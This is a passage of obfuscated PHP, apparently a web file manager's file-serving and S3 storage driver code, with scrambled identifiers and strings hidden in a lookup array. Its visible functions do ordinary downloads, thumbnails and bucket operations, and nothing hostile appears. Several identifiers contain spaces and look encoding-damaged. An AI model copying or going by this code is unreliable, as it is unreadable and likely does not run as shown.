!$this->exist($œÎîÊ‘Ò)) { show_json(LNG($ê´½­¸÷[105]), !1, $œ…Ûö›£); } $ÃÔ†í´¯ = $this->getType() == $ê´½­¸÷[106]; $Û«”‰¬ó = $GLOBALS[$ê´½­¸÷[6]][$ê´½­¸÷[89]][$ê´½­¸÷[107]][$ê´½­¸÷[108]]; $›Üµ—®Ü = (double) $GLOBALS[$ê´½­¸÷[6]][$ê´½­¸÷[89]][$ê´½­¸÷[107]][$ê´½­¸÷[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÑşÂéï = $this->infoFull($œÎîÊ‘Ò); $ïéÂŸ Ú = $ÑşÂéï[$ê´½­¸÷[76]]; $˜†½œ× = gmdate($ê´½­¸÷[110], $ÑşÂéï[$ê´½­¸÷[85]]); $šçË»µï = $œ…Ûö›£ ? $œ…Ûö›£ : $this->iconvApp($ÑşÂéï[$ê´½­¸÷[32]]); $Á¦û»€å = 0; $æ“ïÈ•§ = $ïéÂŸ Ú - 1; $”Ø‡ƒ¹™ = $this->ext($šçË»µï); if (in_array($”Ø‡ƒ¹™, array($ê´½­¸÷[111], $ê´½­¸÷[112], $ê´½­¸÷[113], $ê´½­¸÷[114]))) { $”Ø‡ƒ¹™ = $ê´½­¸÷[115]; } if (in_array($”Ø‡ƒ¹™, array($ê´½­¸÷[116]))) { $”Ø‡ƒ¹™ = $ê´½­¸÷[117]; } if (!$¿œÆ¢Ùë) { $¿œÆ¢Ùë = md5($˜†½œ× . $this->hashSimple($œÎîÊ‘Ò)); } $¿œÆ¢Ùë = $ê´½­¸÷[118] . $¿œÆ¢Ùë . $ê´½­¸÷[118]; $ÕŠä·°€ = get_file_mime($”Ø‡ƒ¹™); $Ø×ù÷Óè = !0; $Ø×ù÷Óè = isset($_GET[$ê´½­¸÷[119]]) ? !1 : !0; if ($™Šè•Ä === !1 && !mime_support($ÕŠä·°€)) { $ÕŠä·°€ = $ê´½­¸÷[120]; } header($ê´½­¸÷[121]); header($ê´½­¸÷[122] . $ÕŠä·°€); $ôÕÜå¸ = rawurlencode($šçË»µï); $ôÕÜå¸ = $ê´½­¸÷[118] . $ôÕÜå¸ . $ê´½­¸÷[123] . $ôÕÜå¸; if ($™Šè•Ä) { header($ê´½­¸÷[124]); header($ê´½­¸÷[125] . $ôÕÜå¸); } else { if ($Ø×ù÷Óè) { header($ê´½­¸÷[126] . $ôÕÜå¸); } } header($ê´½­¸÷[127] . gmdate($ê´½­¸÷[110], time() + 3600 * 24 * 30) . $ê´½­¸÷[128]); header($ê´½­¸÷[129]); header($ê´½­¸÷[130]); header($ê´½­¸÷[131]); if (isset($_SERVER[$ê´½­¸÷[132]]) && strtotime($_SERVER[$ê´½­¸÷[132]]) == $ÑşÂéï[$ê´½­¸÷[85]]) { header($ê´½­¸÷[133], !0, 304); die; } if (isset($_SERVER[$ê´½­¸÷[134]]) && $_SERVER[$ê´½­¸÷[134]] == $¿œÆ¢Ùë) { header($ê´½­¸÷[135] . $¿œÆ¢Ùë, !0, 304); die; } header($ê´½­¸÷[135] . $¿œÆ¢Ùë); header($ê´½­¸÷[136] . $˜†½œ× . $ê´½­¸÷[128]); header($ê´½­¸÷[137] . $šçË»µï); header($ê´½­¸÷[138]); header($ê´½­¸÷[139] . $ïéÂŸ Ú); header($ê´½­¸÷[140]); if (!$™Šè•Ä && $”Ø‡ƒ¹™ == $ê´½­¸÷[141]) { if ($ïéÂŸ Ú > 1024 * 1024 * 5) { die; } $–ß¼ªîÅ = $this->getContent($œÎîÊ‘Ò); $–ß¼ªîÅ = Html::clearSVG($–ß¼ªîÅ); header($ê´½­¸÷[142] . strlen($–ß¼ªîÅ)); echo $–ß¼ªîÅ; die; } $ø¸æ»íÕ = strtolower($_SERVER[$ê´½­¸÷[143]]); if ($ÃÔ†í´¯ && $ø¸æ»íÕ && $Û«”‰¬ó) { if (strstr($ø¸æ»íÕ, $ê´½­¸÷[144])) { header($ê´½­¸÷[145] . $œÎîÊ‘Ò); } else { if (strstr($ø¸æ»íÕ, $ê´½­¸÷[146])) { header($ê´½­¸÷[147] . $œÎîÊ‘Ò); } else { if (strstr($ø¸æ»íÕ, $ê´½­¸÷[148])) { header($ê´½­¸÷[149] . $œÎîÊ‘Ò); } } } if ($›Üµ—®Ü) { header($ê´½­¸÷[150] . $›Üµ—®Ü); } return; } if (isset($_SERVER[$ê´½­¸÷[151]])) { if (preg_match($ê´½­¸÷[152], $_SERVER[$ê´½­¸÷[151]], $ÊÓÒ¢)) { $Á¦û»€å = intval($ÊÓÒ¢[1]); if (!empty($ÊÓÒ¢[2])) { $æ“ïÈ•§ = intval($ÊÓÒ¢[2]); } } header($ê´½­¸÷[153]); header("\x43\157\x6e\164\145\156\164\55\x52\141\156\x67\x65\x3a\x20\x62\x79\x74\145\163\x20{$Á¦û»€å}\55{$æ“ïÈ•§}\x2f" . $ïéÂŸ Ú); } else { header($ê´½­¸÷[154]); } header($ê´½­¸÷[155]); $­¤ââı = !0; if ($_SERVER[$ê´½­¸÷[156]] == $ê´½­¸÷[157] && $ïéÂŸ Ú > 1204 * 1024 * 1024 * 2) { $­¤ââı = !1; } if ($­¤ââı) { header($ê´½­¸÷[158] . ($æ“ïÈ•§ - $Á¦û»€å + 1)); } if ($_SERVER[$ê´½­¸÷[159]] == $ê´½­¸÷[160]) { return; } $ÎÂÂò·Í = 1024 * 100; $Ú·ô’‘ = 0; if ($›Üµ—®Ü) { $Ú·ô’‘ = intval(1000 * 1000 * ($ÎÂÂò·Í / $›Üµ—®Ü)); } while ($Á¦û»€å <= $æ“ïÈ•§) { $š®†®ÍÜ = timeFloat(); check_abort(); $„âœêÏî = $æ“ïÈ•§ - $Á¦û»€å + 1; if ($„âœêÏî <= $ÎÂÂò·Í) { $ÎÂÂò·Í = $„âœêÏî; } echo $this->fileSubstr($œÎîÊ‘Ò, $Á¦û»€å, $ÎÂÂò·Í); $Á¦û»€å += $ÎÂÂò·Í; if ($ÎÂÂò·Í == $„âœêÏî) { $Á¦û»€å = $æ“ïÈ•§ + 1; } if ($Ú·ô’‘) { $«¿Â¡ÓÅ = intval(1000 * 1000 * (timeFloat() - $š®†®ÍÜ)); $çœ•’Ö = $Ú·ô’‘ - $«¿Â¡ÓÅ; if ($çœ•’Ö > 5) { usleep($çœ•’Ö); } } } } public function fileOutServer($ä­¶í¶Î, $ÛçÛ®ï = false, $—Ó³í·ü = false, $´ìùÖíÎ = '') { $this->fileOut($ä­¶í¶Î, $ÛçÛ®ï, $—Ó³í·ü, $´ìùÖíÎ); } public function fileOutLink($Æïõó«í) { header($_SERVER[ïëó©ÒÚ][161] . $Æïõó«í); die; } public function cacheMethod($Ìº‰ŞÆ¸, $½ƒÌ‹ãš, $œÊÙÃÏ× = null) { $‡À—™ŞŸ =& $_SERVER[ïëó©ÒÚ]; static $–‚ÕËÒÄ = array(); $äå½““€ = $½ƒÌ‹ãš ? ltrim($this->getPathOuter($½ƒÌ‹ãš), $‡À—™ŞŸ[8]) : $‡À—™ŞŸ[12]; $Çß¼‹Û = $‡À—™ŞŸ[162] . $Ìº‰ŞÆ¸ . $‡À—™ŞŸ[163] . rtrim($äå½““€, $‡À—™ŞŸ[8]); if (is_null($Ìº‰ŞÆ¸)) { $–‚ÕËÒÄ = array(); return; } if (is_null($½ƒÌ‹ãš)) { foreach ($–‚ÕËÒÄ as $Çß¼‹Û => $©¹»›ü©) { if (!strstr($Çß¼‹Û, $‡À—™ŞŸ[162] . $Ìº‰ŞÆ¸ . $‡À—™ŞŸ[164])) { continue; } unset($–‚ÕËÒÄ[$Çß¼‹Û]); } return; } if (!is_null($œÊÙÃÏ×)) { $–‚ÕËÒÄ[$Çß¼‹Û] = $œÊÙÃÏ×; return; } $Ãó±ØäÌ = isset($–‚ÕËÒÄ[$Çß¼‹Û]) ? $–‚ÕËÒÄ[$Çß¼‹Û] : null; if (!is_null($Ãó±ØäÌ)) { return $Ãó±ØäÌ; } $Ãó±ØäÌ = $this->{$Ìº‰ŞÆ¸}($½ƒÌ‹ãš); $–‚ÕËÒÄ[$Çß¼‹Û] = $Ãó±ØäÌ; return $Ãó±ØäÌ; } public function cacheMethodInfoSet($ôìØÇá, $ïÉ‹Ä—Œ, $¦ô»éò¦ = false) { $ôÇµÉ»Î =& $_SERVER[ïëó©ÒÚ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ôÇµÉ»Î[165], $ôìØÇá, $ïÉ‹Ä—Œ); $this->cacheMethod($ôÇµÉ»Î[166], $ôìØÇá, $ïÉ‹Ä—Œ ? !1 : !0); if (is_array($¦ô»éò¦)) { $this->cacheMethod($ôÇµÉ»Î[167], $ôìØÇá, $¦ô»éò¦); } } public function fileOutImage($õ“¹äû³, $Ê¯ºì´¿ = 250) { $éåç÷¬Õ =& $_SERVER[ïëó©ÒÚ]; set_timeout(); if (substr($õ“¹äû³, 0, 4) == $éåç÷¬Õ[148]) { $this->fileOutLink($õ“¹äû³); } $œæÁ»Ö = $this->info($õ“¹äû³); $…©¢€º = $œæÁ»Ö[$éåç÷¬Õ[32]]; $¯ŠéÓò = !1; if (isset($GLOBALS[$éåç÷¬Õ[168]]) && $GLOBALS[$éåç÷¬Õ[168]][$éåç÷¬Õ[84]] == $œæÁ»Ö[$éåç÷¬Õ[84]]) { $²öæÍë = $GLOBALS[$éåç÷¬Õ[168]][$éåç÷¬Õ[169]]; if (!$œæÁ»Ö[$éåç÷¬Õ[170]]) { $œæÁ»Ö[$éåç÷¬Õ[170]] = $GLOBALS[$éåç÷¬Õ[168]]; } if (isset($²öæÍë[$éåç÷¬Õ[171]])) { if ($²öæÍë[$éåç÷¬Õ[171]] <= $Ê¯ºì´¿ && $²öæÍë[$éåç÷¬Õ[172]] <= $Ê¯ºì´¿) { $¯ŠéÓò = !0; } } $…©¢€º = $œæÁ»Ö[$éåç÷¬Õ[170]][$éåç÷¬Õ[32]]; } if ($œæÁ»Ö[$éåç÷¬Õ[76]] <= 1024 * 50 || $¯ŠéÓò || !function_exists($éåç÷¬Õ[173]) || $œæÁ»Ö[$éåç÷¬Õ[174]] == $éåç÷¬Õ[175]) { return $this->fileOut($õ“¹äû³, !1, $…©¢€º); } if (isset($œæÁ»Ö[$éåç÷¬Õ[170]][$éåç÷¬Õ[176]])) { $ßëÒ¨’æ = $œæÁ»Ö[$éåç÷¬Õ[170]][$éåç÷¬Õ[176]]; } else { if (isset($œæÁ»Ö[$éåç÷¬Õ[170]][$éåç÷¬Õ[177]])) { $ßëÒ¨’æ = $œæÁ»Ö[$éåç÷¬Õ[170]][$éåç÷¬Õ[177]]; } } if (!$ßëÒ¨’æ) { $ßëÒ¨’æ = md5("{$œæÁ»Ö[$éåç÷¬Õ[32]]}\137{$œæÁ»Ö[$éåç÷¬Õ[84]]}\137{$œæÁ»Ö[$éåç÷¬Õ[76]]}\x5f{$Ê¯ºì´¿}"); } $¯˜Ñ˜î = "{$ßëÒ¨’æ}\x5f{$Ê¯ºì´¿}\56\x70\x6e\x67"; if (!($«¡øÚ›º = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $éåç÷¬Õ[178]))) { $Ø‚±ğñ¯ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $éåç÷¬Õ[179]); } else { $Ø‚±ğñ¯ = KodIO::make($«¡øÚ›º); } if ($«¡øÚ›º = IO::fileNameExist($Ø‚±ğñ¯, $¯˜Ñ˜î)) { $‚³Õ¤”ñ = KodIO::make($«¡øÚ›º); return IO::fileOut($‚³Õ¤”ñ, !1, $…©¢€º); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $‚³Õ¤”ñ = DATA_THUMB . $¯˜Ñ˜î; del_file($‚³Õ¤”ñ); if (!@file_exists($‚³Õ¤”ñ)) { $Ò‘†½İ¨ = TEMP_FILES; if (!is_dir($Ò‘†½İ¨)) { mk_dir($Ò‘†½İ¨); } $–•Ò£›‚ = $Ò‘†½İ¨ . $ßëÒ¨’æ . $éåç÷¬Õ[10] . $œæÁ»Ö[$éåç÷¬Õ[174]]; if (!@file_exists($–•Ò£›‚)) { $–•Ò£›‚ = $this->download($õ“¹äû³, $–•Ò£›‚); } ImageThumb::createThumb($–•Ò£›‚, $‚³Õ¤”ñ, $Ê¯ºì´¿, $Ê¯ºì´¿ * 10); } if (!file_exists($‚³Õ¤”ñ) || filesize($‚³Õ¤”ñ) < 100) { return @file_exists($–•Ò£›‚) ? IO::fileOut($–•Ò£›‚) : $this->fileOut($õ“¹äû³); } if (!($¬áäİÑ° = IO::move($‚³Õ¤”ñ, $Ø‚±ğñ¯))) { return IO::fileOut($‚³Õ¤”ñ); } del_file($‚³Õ¤”ñ); IO::fileOut($¬áäİÑ°); } public function fileOutImageServer($È–²ºŞ´, $ ¬Ÿõ™ = 250) { $this->fileOutImage($È–²ºŞ´, $ ¬Ÿõ™); } public function fileNameAuto($Òá¢é½¢, $„ù¯ï², $ÛâëÄ¹ = REPEAT_RENAME, $†ê×í¼³ = false) { $Æ’¢³İ =& $_SERVER[ïëó©ÒÚ]; $æĞ£‹Ä¹ = $Òá¢é½¢ === $Æ’¢³İ[12] ? $„ù¯ï² : rtrim($Òá¢é½¢, $Æ’¢³İ[8]) . $Æ’¢³İ[8] . $„ù¯ï²; if ($ÛâëÄ¹ == REPEAT_REPLACE || !$this->exist($æĞ£‹Ä¹) || $†ê×í¼³ && $ÛâëÄ¹ != REPEAT_RENAME_FOLDER) { return $„ù¯ï²; } if ($ÛâëÄ¹ == REPEAT_SKIP) { return !1; } $ºÛ”à‚ = $Æ’¢³İ[10] . get_path_ext($„ù¯ï²); $ºÛ”à‚ = $ºÛ”à‚ == $Æ’¢³İ[10] || $†ê×í¼³ ? $Æ’¢³İ[12] : $ºÛ”à‚; $š¾úıÏ© = 1; $¨ÓÙÅ¨µ = substr($„ù¯ï², 0, strlen($„ù¯ï²) - strlen($ºÛ”à‚)); $…ô¯õô” = $¨ÓÙÅ¨µ . "\x28{$š¾úıÏ©}\51{$ºÛ”à‚}"; while ($this->exist(rtrim($Òá¢é½¢, $Æ’¢³İ[8]) . $Æ’¢³İ[8] . $…ô¯õô”)) { $…ô¯õô” = $¨ÓÙÅ¨µ . "\50{$š¾úıÏ©}\x29{$ºÛ”à‚}"; $š¾úıÏ©++; } return $…ô¯õô”; } private function fileNameAutoList($‹ñ«œùñ, $ª§©ô¢, $‘€Ÿ§±ç = false) { $²õéÂè =& $_SERVER[ïëó©ÒÚ]; $ÂÌâÈÜ  = $this->listPath($‹ñ«œùñ, !0); $ÂÌâÈÜ  = array_merge($ÂÌâÈÜ [$²õéÂè[82]], $ÂÌâÈÜ [$²õéÂè[83]]); $¨©à½¼¦ = array_to_keyvalue($ÂÌâÈÜ , $²õéÂè[12], $²õéÂè[32]); $Ö¨Ööæ = $²õéÂè[10] . get_path_ext($ª§©ô¢); $Ö¨Ööæ = $Ö¨Ööæ == $²õéÂè[10] || $‘€Ÿ§±ç ? $²õéÂè[12] : $Ö¨Ööæ; $¾¾°å´Õ = substr($ª§©ô¢, 0, strlen($ª§©ô¢) - strlen($Ö¨Ööæ)); $²¬²Ç» = $¾¾°å´Õ . "\x28\x30\51{$Ö¨Ööæ}"; for ($ïÍÓ§æ‚ = 1; $ïÍÓ§æ‚ <= count($¨©à½¼¦) + 1; $ïÍÓ§æ‚++) { $²¬²Ç» = $¾¾°å´Õ . "\50{$ïÍÓ§æ‚}\x29{$Ö¨Ööæ}"; if (!in_array_not_case($²¬²Ç», $¨©à½¼¦)) { return $²¬²Ç»; } } return $²¬²Ç»; } public function listAllFiles($’õ ‹, $½«÷ôù–, $şáéö = array()) { $…Ô³°Š® =& $_SERVER[ïëó©ÒÚ]; if (empty($½«÷ôù–)) { return array(); } $«úçìÉ¢ = array(); $’õ ‹ = trim($’õ ‹, $…Ô³°Š®[8]); foreach ($½«÷ôù– as $“Šß­äù) { $ÕıÊùú³ = ltrim(substr(trim($“Šß­äù, $…Ô³°Š®[8]), strlen($’õ ‹)), $…Ô³°Š®[8]); $«úçìÉ¢ = array_merge($«úçìÉ¢, $this->slicePath($ÕıÊùú³)); } $Ú†„ù­‹ = array(); foreach (array_unique($«úçìÉ¢) as $“Šß­äù) { $ ®ß´Ş” = array($…Ô³°Š®[84] => $this->getPathOuter($…Ô³°Š®[8] . $’õ ‹ . $…Ô³°Š®[8] . $“Šß­äù), $…Ô³°Š®[75] => 1, $…Ô³°Š®[76] => 0); if (substr($“Šß­äù, -1) != $…Ô³°Š®[8]) { $ ®ß´Ş”[$…Ô³°Š®[75]] = 0; $Ò“·ù‰Ô = $this->getPath($’õ ‹ . $…Ô³°Š®[8] . $“Šß­äù); $ ®ß´Ş”[$…Ô³°Š®[76]] = isset($şáéö[$Ò“·ù‰Ô]) ? $şáéö[$Ò“·ù‰Ô] : $this->size($Ò“·ù‰Ô); } $Ú†„ù­‹[] = $ ®ß´Ş”; } return $Ú†„ù­‹; } public function slicePath($ßã§á§÷) { $³Óûñ‡î =& $_SERVER[ïëó©ÒÚ]; $ÃË’˜¬¡ = explode($³Óûñ‡î[8], trim($ßã§á§÷, $³Óûñ‡î[8])); $å›ìõµ„ = 0; do { ++$å›ìõµ„; $¿Â¼ß‘ß[] = implode($³Óûñ‡î[8], array_slice($ÃË’˜¬¡, 0, $å›ìõµ„)) . $³Óûñ‡î[8]; } while ($å›ìõµ„ < count($ÃË’˜¬¡)); $¿Â¼ß‘ß[count($ÃË’˜¬¡) - 1] = $ßã§á§÷; return $¿Â¼ß‘ß; } public function getHost() { $«ª°Š±ğ =& $_SERVER[ïëó©ÒÚ]; $¨ª›Î± = parse_url(trim($this->domain, $«ª°Š±ğ[8])); $ŠµåŞ…Ì = isset($¨ª›Î±[$«ª°Š±ğ[180]]) ? $¨ª›Î±[$«ª°Š±ğ[180]] : http_type(); $°¸·ìçü = isset($¨ª›Î±[$«ª°Š±ğ[181]]) ? $¨ª›Î±[$«ª°Š±ğ[181]] : $¨ª›Î±[$«ª°Š±ğ[84]]; if (isset($¨ª›Î±[$«ª°Š±ğ[182]])) { $°¸·ìçü .= $«ª°Š±ğ[4] . $¨ª›Î±[$«ª°Š±ğ[182]]; } return $ŠµåŞ…Ì . $«ª°Š±ğ[183] . $°¸·ìçü; } public function pathEncode($–½çÃœŸ) { $ïò³ĞÁÔ =& $_SERVER[ïëó©ÒÚ]; return str_replace($ïò³ĞÁÔ[184], $ïò³ĞÁÔ[8], rawurlencode($–½çÃœŸ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($¤ÑİéÙ) { set_timeout(); require_once SDK_DIR . $_SERVER[ïëó©ÒÚ][185]; parent::__construct(); $this->_init($¤ÑİéÙ); } public function _init($Û²Ò†›£) { foreach ($Û²Ò†›£ as $³ñî«Éè => $ßñ€ÚÄõ) { if (isset($this->{$³ñî«Éè})) { $this->{$³ñî«Éè} = $ßñ€ÚÄõ; } } $this->endpoint = $Û²Ò†›£[$_SERVER[ïëó©ÒÚ][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($øÕÑ±Ôœ = "\x76\64") { $this->signVer = $øÕÑ±Ôœ; $this->client->setSignatureVersion($øÕÑ±Ôœ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $â€àÙú± =& $_SERVER[ïëó©ÒÚ]; $Öœ½¶¶í = $this->getBucketCors(); if (!$Öœ½¶¶í || !is_array($Öœ½¶¶í)) { return !1; } if ($Öœ½¶¶í[$â€àÙú±[187]] != $â€àÙú±[188] || $Öœ½¶¶í[$â€àÙú±[189]] != $â€àÙú±[188]) { return !1; } $˜¦ÇÕıÛ = array_map($â€àÙú±[190], $Öœ½¶¶í[$â€àÙú±[191]]); if (!is_array($˜¦ÇÕıÛ)) { $˜¦ÇÕıÛ = array(); } $¾Ã»üÃ = array($â€àÙú±[192], $â€àÙú±[193], $â€àÙú±[194], $â€àÙú±[195], $â€àÙú±[196]); $ıö‘éŸÙ = array_diff($¾Ã»üÃ, $˜¦ÇÕıÛ); return empty($ıö‘éŸÙ); } public function mkfile($ŠğÚò¥, $ˆ„ßšÜÆ = '', $îë«÷…Ô = REPEAT_RENAME) { $¥Ç¯çıÁ = $this->setContent($ŠğÚò¥, $ˆ„ßšÜÆ); if ($¥Ç¯çıÁ !== !1) { return $this->getPathOuter($ŠğÚò¥); } return !1; } public function mkdir($ññğÌ©, $øÎûø§æ = REPEAT_SKIP) { $ë³ÓÊôÄ =& $_SERVER[ïëó©ÒÚ]; if (empty($ññğÌ©) && $ññğÌ© !== $ë³ÓÊôÄ[197]) { return !1; } if ($øÎûø§æ && $this->_isFolder($ññğÌ©)) { return $this->getPathOuter($ññğÌ©); } $½ıœ›Ò¾ = $this->setContent($ññğÌ©, $ë³ÓÊôÄ[12], !0); if ($½ıœ›Ò¾ !== !1) { return $this->getPathOuter($ññğÌ©); } return !1; } public function copyFile($ıŞœ¨©‘, $ôª»î¸Û, $¿´Ù¸¶¥ = array()) { $¤À‚ƒ½ =& $_SERVER[ïëó©ÒÚ]; $¸›Œ¾°Æ = $this->objectMeta($ıŞœ¨©‘); if (!$¸›Œ¾°Æ) { return !1; } if ($¸›Œ¾°Æ[$¤À‚ƒ½[76]] <= 1024 * 1024 * 200) { $ËÏãÉ² = $this->client->copyObject($this->bucket, $ıŞœ¨©‘, $this->bucket, $ôª»î¸Û, $¤À‚ƒ½[198], $¿´Ù¸¶¥); } else { $ËÏãÉ² = $this->client->multiCopyObject($this->bucket, $ıŞœ¨©‘, $this->bucket, $ôª»î¸Û, $¿´Ù¸¶¥); } $ËÏãÉ² = $ËÏãÉ² ? $this->getPathOuter($ôª»î¸Û) : !1; return $ËÏãÉ²; } public function moveFile($ë·œÖô, $ š¦ÜäÁ) { if ($this->copyFile($ë·œÖô, $ š¦ÜäÁ)) { $this->delFile($ë·œÖô); return $this->getPathOuter($ š¦ÜäÁ); } return !1; } public function delFile($ˆÚÌ‹ûÒ) { return $this->client->deleteObject($this->bucket, $ˆÚÌ‹ûÒ); } public function delFolder($«Âªë»è) { $ÙçŠŸéô =& $_SERVER[ïëó©ÒÚ]; if (!$this->exist($«Âªë»è)) { return !0; } $this->listItemCache = !1; $¡…Ğ‡÷Ò = $this->fileList($«Âªë»è); $this->listItemCache = !0; $±ª¥’Â¿ = trim($«Âªë»è, $ÙçŠŸéô[8]) . $ÙçŠŸéô[8]; if (!empty($«Âªë»è) && $«Âªë»è !== $ÙçŠŸéô[197] && !in_array($±ª¥’Â¿, $¡…Ğ‡÷Ò[$ÙçŠŸéô[82]])) { $¡…Ğ‡÷Ò[$ÙçŠŸéô[82]][] = $±ª¥’Â¿; } $Í­§ÙŞğ = $this->delByBatch($¡…Ğ‡÷Ò[$ÙçŠŸéô[83]]); if (!$Í­§ÙŞğ) { return !1; } $Í­§ÙŞğ = $this->delByBatch($¡…Ğ‡÷Ò[$ÙçŠŸéô[82]]); if (!$Í­§ÙŞğ) { return !1; } return $this->delFile($±ª¥’Â¿); } private function delByBatch($£Æüáä•) { foreach (array_chunk($£Æüáä•, 1000) as $Æ…„×²Õ) { $ÈÖÅÏÚÆ = $this->client->deleteObjects($this->bucket, $Æ…„×²Õ); if (!$ÈÖÅÏÚÆ) { return !1; } } return !0; } public function rename($¨ÖèÎ¦Õ, $³¨“¢è) { return $this->renameObject($¨ÖèÎ¦Õ, $³¨“¢è); } public function listPath($‘üäÎ·Œ, $õßâÒÊº = false) { $—¶û‚Ô± =& $_SERVER[ïëó©ÒÚ]; $ÍÑ‰ê«Î = $this->fileList($‘üäÎ·Œ, $—¶û‚Ô±[8], !0); foreach ($ÍÑ‰ê«Î[$—¶û‚Ô±[82]] as $ßãÚğª€ => $€½™÷¬) { $ÍÑ‰ê«Î[$—¶û‚Ô±[82]][$ßãÚğª€] = $this->folderInfo($€½™÷¬, $õßâÒÊº, $€½™÷¬); } foreach ($ÍÑ‰ê«Î[$—¶û‚Ô±[83]] as $ßãÚğª€ => $€½™÷¬) { $ÍÑ‰ê«Î[$—¶û‚Ô±[83]][$ßãÚğª€] = $this->fileInfo($€½™÷¬[$—¶û‚Ô±[32]], $õßâÒÊº, $€½™÷¬); } return $ÍÑ‰ê«Î; } protected function infoChildren($¦ÄÑº‹·, &$ÜŠúÖØÆ) { $µÂ¬Æ€‰ =& $_SERVER[ïëó©ÒÚ]; $ıå­²Â = $this->fileList($¦ÄÑº‹·, $µÂ¬Æ€‰[12], !0); $ÜŠúÖØÆ[$µÂ¬Æ€‰[78]] += count($ıå­²Â[$µÂ¬Æ€‰[82]]); $ÜŠúÖØÆ[$µÂ¬Æ€‰[77]] += count($ıå­²Â[$µÂ¬Æ€‰[83]]); foreach ($ıå­²Â[$µÂ¬Æ€‰[83]] as $Ú©âòÙ) { if (!$Ú©âòÙ || !$Ú©âòÙ[$µÂ¬Æ€‰[76]]) { continue; } $ÜŠúÖØÆ[$µÂ¬Æ€‰[76]] += $Ú©âòÙ[$µÂ¬Æ€‰[76]]; } } private function fileInfo($ğöó¶ıÆ, $èñİû = false, $ŸŒğèÖˆ = array()) { $óœÀ¦ =& $_SERVER[ïëó©ÒÚ]; $ãŒæšÂú = array($óœÀ¦[32] => $this->pathThis($ğöó¶ıÆ), $óœÀ¦[84] => $this->getPathOuter($ğöó¶ıÆ), $óœÀ¦[33] => $óœÀ¦[199], $óœÀ¦[174] => $this->ext($ğöó¶ıÆ), $óœÀ¦[76] => isset($ŸŒğèÖˆ[$óœÀ¦[76]]) ? $ŸŒğèÖˆ[$óœÀ¦[76]] : 0); if ($èñİû) { return $ãŒæšÂú; } $ãŒæšÂú[$óœÀ¦[200]] = $ãŒæšÂú[$óœÀ¦[85]] = 0; $ãŒæšÂú[$óœÀ¦[201]] = $ãŒæšÂú[$óœÀ¦[202]] = !0; if (empty($ŸŒğèÖˆ)) { $ŸŒğèÖˆ = $this->objectMeta($ğöó¶ıÆ); if (!$ŸŒğèÖˆ) { return $ãŒæšÂú; } } if (isset($ŸŒğèÖˆ[$óœÀ¦[203]])) { $ãŒæšÂú[$óœÀ¦[85]] = $ŸŒğèÖˆ[$óœÀ¦[203]]; } if (isset($ŸŒğèÖˆ[$óœÀ¦[76]])) { $ãŒæšÂú[$óœÀ¦[76]] = $ŸŒğèÖˆ[$óœÀ¦[76]]; } return $ãŒæšÂú; } private function folderInfo($Ëöë“§›, $‚œ¬†”¸ = false, $Àİòéİù = array()) { $ˆÈ…¬Ãı =& $_SERVER[ïëó©ÒÚ]; $ºû‘Îïõ = array($ˆÈ…¬Ãı[32] => $this->pathThis($Ëöë“§›), $ˆÈ…¬Ãı[84] => $this->getPathOuter($ˆÈ…¬Ãı[8] . $Ëöë“§›), $ˆÈ…¬Ãı[33] => $ˆÈ…¬Ãı[75]); if ($‚œ¬†”¸) { return $ºû‘Îïõ; } $ºû‘Îïõ[$ˆÈ…¬Ãı[200]] = $ºû‘Îïõ[$ˆÈ…¬Ãı[85]] = 0; $ºû‘Îïõ[$ˆÈ…¬Ãı[201]] = $ºû‘Îïõ[$ˆÈ…¬Ãı[202]] = !0; if ($Ëöë“§› == $ˆÈ…¬Ãı[12]) { return $ºû‘Îïõ; } if (empty($Àİòéİù)) { $Àİòéİù = $this->objectMeta(trim($Ëöë“§›, $ˆÈ…¬Ãı[8]) . $ˆÈ…¬Ãı[8]); } if (isset($Àİòéİù[$ˆÈ…¬Ãı[203]])) { $ºû‘Îïõ[$ˆÈ…¬Ãı[200]] = $Àİòéİù[$ˆÈ…¬Ãı[203]]; } return $ºû‘Îïõ; } private function fileList($ù¾Şğº©, $ÀÆ£²Ô = '', $áäÄ“©† = 0) { $§¸»ò¥ =& $_SERVER[ïëó©ÒÚ]; $“µ—»¡ = rtrim($ù¾Şğº©, $§¸»ò¥[8]) . $§¸»ò¥[8]; $×õ‚áË = $this->listObjs($“µ—»¡, null, null, $ÀÆ£²Ô); if (!$×õ‚áË) { return array($§¸»ò¥[82] => array(), $§¸»ò¥[83] => array()); } $È—ò´÷ = $ñ—œí÷ü = array(); foreach ($×õ‚áË[$§¸»ò¥[204]] as $è±¼À) { $”ÄªÁ¥ = $è±¼À[$§¸»ò¥[32]]; if ($”ÄªÁ¥ == $“µ—»¡) { continue; } $óí²ª¼û = isset($è±¼À[$§¸»ò¥[76]]) ? $è±¼À[$§¸»ò¥[76]] : 0; $›ä‡ÃãŠ = $óí²ª¼û == 0 && substr($”ÄªÁ¥, strlen($”ÄªÁ¥) - 1, 1) == $§¸»ò¥[8] ? !0 : !1; $this->cacheMethodInfoSet($”ÄªÁ¥, $›ä‡ÃãŠ, $è±¼À); if ($›ä‡ÃãŠ) { $È—ò´÷[] = $”ÄªÁ¥; continue; } $ñ—œí÷ü[] = $áäÄ“©† ? $è±¼À : $”ÄªÁ¥; } foreach ($×õ‚áË[$§¸»ò¥[205]] as $è±¼À) { $È—ò´÷[] = $è±¼À[$§¸»ò¥[32]]; $this->cacheMethodInfoSet($è±¼À[$§¸»ò¥[32]], !0); } $this->cacheMethodInfoSet($ù¾Şğº©, !0); return array($§¸»ò¥[82] => $È—ò´÷, $§¸»ò¥[83] => $ñ—œí÷ü); } private function listObjs($èã±ÅŞ, $”ùÜÂ½Ÿ = null, $¹İšÏû” = null, $Ü³°Šƒı = null) { $Öîè „ =& $_SERVER[ïëó©ÒÚ]; $èã±ÅŞ = trim($èã±ÅŞ, 